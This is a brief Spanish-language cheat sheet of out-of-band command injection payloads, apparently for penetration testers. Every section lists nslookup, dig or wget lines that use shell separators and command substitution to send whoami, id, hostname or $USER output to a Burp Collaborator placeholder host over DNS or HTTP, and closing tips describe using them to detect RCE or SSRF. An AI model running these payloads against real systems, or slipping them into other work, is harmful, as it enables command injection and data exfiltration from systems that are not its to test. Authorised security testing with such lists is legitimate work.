---

### 🌐 **DNS Exfiltration Cheat Sheet**

---
---
## **Payloads usando `nslookup`**
Estos payloads intentan realizar una consulta DNS hacia un subdominio controlado.  
```python
||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||``
x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN
nslookup $USER.BURP-COLLABORATOR-SUBDOMAIN
nslookup $(id -un).BURP-COLLABORATOR-SUBDOMAIN
nslookup x.BURP-COLLABORATOR-SUBDOMAIN
nslookup $(hostname).BURP-COLLABORATOR-SUBDOMAIN
```

---
## **Payloads usando `dig`**
Estos payloads hacen uso de `dig` para realizar consultas DNS hacia el subdominio controlado.  
```python
dig $(whoami).BURP-COLLABORATOR-SUBDOMAIN
dig `whoami`.BURP-COLLABORATOR-SUBDOMAIN
dig $USER.BURP-COLLABORATOR-SUBDOMAIN
dig @8.8.8.8 x.BURP-COLLABORATOR-SUBDOMAIN
```

---
## **Payloads usando `wget`**
Utiliza `wget` para enviar información a través de una solicitud HTTP.  
```python
wget http://BURP-COLLABORATOR-SUBDOMAIN/$(whoami)
wget --post-data="data=$(id -un)" http://BURP-COLLABORATOR-SUBDOMAIN/
wget --header="User-Agent: $(hostname)" http://BURP-COLLABORATOR-SUBDOMAIN/
```

---

### 💡 **Tips de Uso:**
- Utiliza servicios como **Burp Collaborator**, **Interact.sh** o tu propio servidor DNS para capturar las solicitudes.  
- Estos payloads son útiles para identificar ejecución de comandos (RCE) o vulnerabilidades de Server-Side Request Forgery (SSRF).  
- Modifica los comandos para adaptarlos al entorno que estés probando.  

---
